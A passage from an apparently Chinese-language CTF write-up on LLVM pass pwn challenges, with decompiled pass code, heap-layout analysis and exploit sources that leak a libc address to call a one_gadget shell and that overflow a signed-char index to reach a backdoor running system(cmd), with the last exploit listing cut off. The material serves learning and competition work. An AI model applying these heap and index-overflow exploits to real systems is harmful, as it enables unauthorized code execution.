class="number">29</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    v27 = <span class="number">-2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v15</span><br><span class="line">      + <span class="number">24</span> * v27</span><br><span class="line">      - <span class="number">24LL</span> * (<span class="type">unsigned</span> <span class="type">int</span>)llvm::CallBase::<span class="built_in">getNumTotalBundleOperands</span>((llvm::CallBase *)(v6 - <span class="number">24</span>));</span><br><span class="line">  v29 = v8 - <span class="number">24LL</span> * (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-1431655765</span> * (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">unsigned</span> __int64)(v28 - v29) &gt;&gt; <span class="number">3</span>) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_154;</span><br><span class="line">  <span class="keyword">if</span> ( (*(_DWORD *)(v8 + <span class="number">20</span>) &amp; <span class="number">0xFFFFFFF</span>u) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_153;</span><br><span class="line">  v30 = *(_QWORD *)(v29 + <span class="number">24</span>);</span><br><span class="line">  <span class="built_in">sub_2430</span>(&amp;src, v25);</span><br><span class="line">  <span class="built_in">sub_2430</span>(v84, v30);</span><br><span class="line">  v31 = n;</span><br><span class="line">  v32 = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  v32[<span class="number">2</span>] = byte_2040f8;</span><br><span class="line">  byte_2040f8 = v32;</span><br><span class="line">  v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  <span class="built_in">memcpy</span>(v32, src, v31);</span><br><span class="line">  v34 = v32 + <span class="number">1</span>;</span><br><span class="line">  v35 = (<span class="type">char</span> *)v84[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">memcpy</span>(v34, v84[<span class="number">0</span>], (<span class="type">size_t</span>)v84[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v35 != &amp;v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v35)</span></span>;</span><br><span class="line">    v33 = (<span class="type">char</span> *)src;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v33 != v88 )</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v33)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行的代码意思是要求<code>save</code>函数要有<code>2</code>个参数，从代码中我们可以看出<code>byte_2040f8</code>指向一个新申请的<code>0x20</code>大小的堆块，而后面的操作看的也不是太懂，因为前面看的也不是很懂，于是用<code>gdb</code>调试了一下，测试脚本：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>gdb</code>中查看<code>byte_2040f8</code>：  </p><img src="/2024/03/15/llvm/4.png" class="" title="我的图图呢">  <p>可以看到<code>byte_2040f8</code>指向一个新<code>malloc</code>的堆块，堆块大小为<code>0x18</code>，堆块的内容为<code>save</code>函数的第一和第二个参数，回到最开始程序刚进入到对<code>save</code>函数的进行处理的时候，我们看看堆块的布局：  </p><img src="/2024/03/15/llvm/5.png" class="" title="我的图图呢"><p>可以看到<code>unsortedbin</code>中存在一个堆块，<code>tcache</code>中有<code>7</code>个<code>0x20</code>大小的堆块，如果我们将<code>7</code>个堆块申请出来，再用<code>save</code>函数申请<code>0x20</code>大小的堆块，堆管理系统则会直接切割<code>unsortedbin</code>中的堆块进行分配，此时申请出来的堆块会残留着之前<code>unsortedbin</code>在<code>fd</code>上有关<code>libc</code>的地址，即我们可以令<code>*byte_2040f8</code>为<code>libc</code>上的一个地址<br>此时我们可利用<code>stealkey</code>函数将<code>*byte_2040f8</code>上的值赋值给<code>byte_204100</code>，代码如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/6.png" class="" title="我的图图呢">  <p>再利用<code>fakekey</code>函数<code>*byte_2040f8 = byte_204100 - one_gadget与byte_204100上有关libc地址的偏移</code>，即可另<code>*byte_2040f8</code>的值为<code>one_gadget</code>的地址，最后使用<code>run</code>函数执行<code>one_gadget</code>直接<code>getshell</code>。最终<code>exp</code>如下：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// clang-8 -S -emit-llvm exp.c -o exp.ll</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">(<span class="type">char</span> *a, <span class="type">char</span> *b)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">takeaway</span><span class="params">(<span class="type">char</span> *c)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">stealkey</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fakekey</span><span class="params">(<span class="type">int</span> d)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">B4ckDo0r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;Qanux&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">save</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;Qanux&quot;</span>);</span><br><span class="line">    <span class="built_in">stealkey</span>();</span><br><span class="line">    <span class="built_in">fakekey</span>(<span class="number">-0x1090f2</span>);</span><br><span class="line">    <span class="built_in">run</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="强网杯-2022-yakagame"><a href="#强网杯-2022-yakagame" class="headerlink" title="[强网杯 2022] yakagame"></a>[强网杯 2022] yakagame</h3><p>这道题的<code>PASS</code>注册的名称并不能直接在<code>start</code>函数中找打，看了<code>winmt</code>师傅的文章发现可以对<code>__cxa_atexit</code>函数“交叉引用”来定位，如下图：  </p><img src="/2024/03/15/llvm/7.png" class="" title="我的图图呢">  <p>可以看见<code>PASS</code>注册的名称为<code>ayaka</code>（没事干给<code>ida64</code>换了一个主题哈哈哈）。接下来对主要函数进行分析，用上面题目的方法定位到<code>sub_C880</code>即为重写的<code>runOnFunction</code>函数。<br>还是和之前的方法一样，发现程序主要是对<code>gamestart</code>函数的定义进行分析和操作，接下来详细分析各个部分<br>对<code>fight</code>函数的处理：  </p><img src="/2024/03/15/llvm/8.png" class="" title="我的图图呢">  <p>该函数只能有一个参数，以该参数作为索引，从<code>weaponlist</code>数组中取出一个数<code>v53</code>与<code>boss</code>进行比较：  </p><ul><li>如果<code>v53</code>的值小于<code>boss</code>，则输出<code>loss</code>  </li><li>如果<code>v53</code>的值大于等于<code>boss</code>，则输出<code>win</code>，并进行赋值操作：<code>*score = v53 - boss</code>  </li><li>如果<code>*score &gt; 0x12345678</code>，则会进入<code>backdoor</code>函数</li></ul><p>接下来就看看这个<code>backdoor</code>函数：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">backdoor</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wow!! this is you gift&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以想到，如果我们可以控制<code>cmd</code>的值并且执行<code>backdoor</code>函数，我们就能够<code>getshell</code><br>对<code>merge</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;merge&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v52 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v52 != <span class="number">3</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v15 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v15);</span><br><span class="line">  v50 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数一</span></span><br><span class="line">  v16 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">1u</span>);</span><br><span class="line">  v51 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v16);</span><br><span class="line">  v49 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v51);<span class="comment">// 参数二</span></span><br><span class="line">  weaponlist[v50] += weaponlist[v49];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数需要有<code>2</code>个参数，分别为<code>v50</code>和<code>v49</code>，最后进行<code>weaponlist[v50] += weaponlist[v49]</code>操作<br>下面几个函数比较容易看懂且用处不大，就不做分析<br>对<code>destroy</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;destroy&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v48 = <span class="number">0</span>;</span><br><span class="line">  v47 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v47 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v17 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v46 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v17);</span><br><span class="line">  v48 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v46);</span><br><span class="line">  weaponlist[v48] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对<code>upgrade</code>函数的处理：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v58, <span class="string">&quot;upgrade&quot;</span>) &amp; <span class="number">1</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">  v45 = <span class="number">0</span>;</span><br><span class="line">  v44 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);</span><br><span class="line">  <span class="keyword">if</span> ( v44 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v18 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v43 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v18);</span><br><span class="line">  v45 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v43);</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">    weaponlist[k] += v45;</span><br><span class="line">  v19 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;upgrade finish&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v19, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v20 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;enjoy your war&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v20, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一系列关于原神梗的函数（原神<code>56</code>级玩家）：  </p><img src="/2024/03/15/llvm/9.png" class="" title="我的图图呢">  <p>可以看出这一系列函数允许我们对<code>cmd</code>这个全局变量进行操作，所以我们可以通过对这几个函数的顺序进行适当的排序即可令<code>cmd</code>为我们想要的值<br>我们可以通过下面这段代码将<code>cmd</code>的值设置为<code>&quot;cat flag&quot;</code>  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tiandongwanxiang</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br><span class="line"><span class="built_in">guobapenhuo</span>();</span><br><span class="line"><span class="built_in">wuxiangdeyidao</span>();</span><br></pre></td></tr></table></figure><p>效果如下：  </p><img src="/2024/03/15/llvm/10.png" class="" title="我的图图呢">  <p>接下来是最重要的部分，当函数的名字不满足上述的所有条件后才会执行以下这段代码：  </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v37 = <span class="number">0</span>;</span><br><span class="line">  v36 = llvm::CallBase::<span class="built_in">getNumOperands</span>(v60);<span class="comment">// 获取函数的参数个数</span></span><br><span class="line">  <span class="keyword">if</span> ( v36 != <span class="number">2</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  v21 = llvm::CallBase::<span class="built_in">getArgOperand</span>(v60, <span class="number">0</span>);</span><br><span class="line">  v35 = (llvm::ConstantInt *)llvm::<span class="built_in">dyn_cast</span>&lt;llvm::ConstantInt,llvm::Value&gt;(v21);</span><br><span class="line">  v37 = llvm::ConstantInt::<span class="built_in">getZExtValue</span>(v35);<span class="comment">// 获取函数的第一个参数</span></span><br><span class="line">  v34 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">begin</span>(&amp;funMap[abi:cxx11]);<span class="comment">// v34为map的迭代器，指向begin</span></span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// _Rb_tree_iterator为红黑树迭代器，map的底层即为红黑树</span></span><br><span class="line">    v32 = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">    <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>!=(&amp;v34, &amp;v32) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;                        <span class="comment">// 如果迭代器到达map的尾端着退出循环</span></span><br><span class="line">    v22 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);<span class="comment">// </span></span><br><span class="line">                                    <span class="comment">// 将v34这个std::pair&lt;std::string const,unsigned char&gt;类型对象赋值给v22</span></span><br><span class="line">    <span class="keyword">if</span> ( (std::<span class="keyword">operator</span>==&lt;<span class="type">char</span>&gt;(v22, v58) &amp; <span class="number">1</span>) != <span class="number">0</span> )<span class="comment">// v58为函数名</span></span><br><span class="line">    &#123;                               <span class="comment">// map中存在该函数名</span></span><br><span class="line">      v23 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(</span><br><span class="line">              &amp;std::cout,</span><br><span class="line">              <span class="string">&quot;you really want this?all right,i will add it into the weapon list&quot;</span>);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v23, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v24 = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>-&gt;(&amp;v34);</span><br><span class="line">      weaponlist[v33] = *(_BYTE *)(v24 + <span class="number">0x20</span>);<span class="comment">// 将value赋值给weaponlist，漏洞出现的地方</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v33;                          <span class="comment">// 用于记录map中已经存在的函数个数</span></span><br><span class="line">    v31[<span class="number">1</span>] = std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>++(&amp;v34, <span class="number">0LL</span>);</span><br><span class="line">    <span class="comment">// 将v34迭代器向前推进一个位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  v31[<span class="number">0</span>] = std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">end</span>(&amp;funMap[abi:cxx11]);</span><br><span class="line">  <span class="keyword">if</span> ( (std::_Rb_tree_iterator&lt;std::pair&lt;std::string <span class="type">const</span>,<span class="type">unsigned</span> <span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>==(&amp;v34, v31) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;                                 <span class="comment">// 当前函数不存在map中，输出</span></span><br><span class="line">    v25 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;wow!! you find a new weapon&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v25, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  v28 = v37;</span><br><span class="line">  v29[<span class="number">0</span>] = llvm::Value::<span class="built_in">getName</span>(CalledFunction);<span class="comment">// 获取函数名</span></span><br><span class="line">  v29[<span class="number">1</span>] = v26;                     <span class="comment">// 处理函数的参数</span></span><br><span class="line">  llvm::<span class="function">StringRef::<span class="keyword">operator</span> <span class="title">std::string</span><span class="params">(v30, v29)</span></span>;<span class="comment">// 将v29转换为StringRef类型对象后存储在v30中</span></span><br><span class="line">  *(_BYTE *)std::map&lt;std::string,<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;funMap[abi:cxx11], v30) = v28;<span class="comment">// 将该函数插入map中</span></span><br><span class="line">  std::string::~<span class="built_in">string</span>(v30);</span><br><span class="line">&#125;</span><br><span class="line">std::string::~<span class="built_in">string</span>(v58);</span><br></pre></td></tr></table></figure><p>由于比较重要，所以代码中写了很多注释，下面就只讲讲几个比较重要的点：<br>代码中遍历的时候是按照函数名大小遍历的，所以我们在利用该段代码的时候要注意函数的命名<br>漏洞出现在<code>weaponlist[v33] = *(_BYTE *)(v24 + 0x20);</code>这一段代码<br>该<code>weaponlist</code>数组是通过<code>char</code>类型的<code>v33</code>进行索引的，而有符号<code>char</code>类型的范围是<code>-128 ~ +127</code>，也就是说，当<code>v33</code>的值为<code>127</code>时，此时加<code>1</code>，<code>v33</code>的值会变成<code>-128</code>而不是<code>128</code>，所以我们可以利用这个点来造成数组后溢来修改后面的值<br>在<code>weaponlist</code>数组后存在的数据：  </p><img src="/2024/03/15/llvm/11.png" class="" title="我的图图呢">  <p>可以看见<code>score</code>指针就在其后面，如果我们可以利用数组后溢来改写<code>score</code>指针指向一个很大的值的地址，那么我们在使用<code>fight</code>函数时就可以满足<code>backdoor</code>函数的调用条件从而进入<code>backdoor</code>函数，而<code>cmd</code>已经在前面被我们改写成<code>&quot;cat flag&quot;</code>，所以进入<code>backdoor</code>函数后我们即可获得<code>flag</code><br>完整<code>exp</code>如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 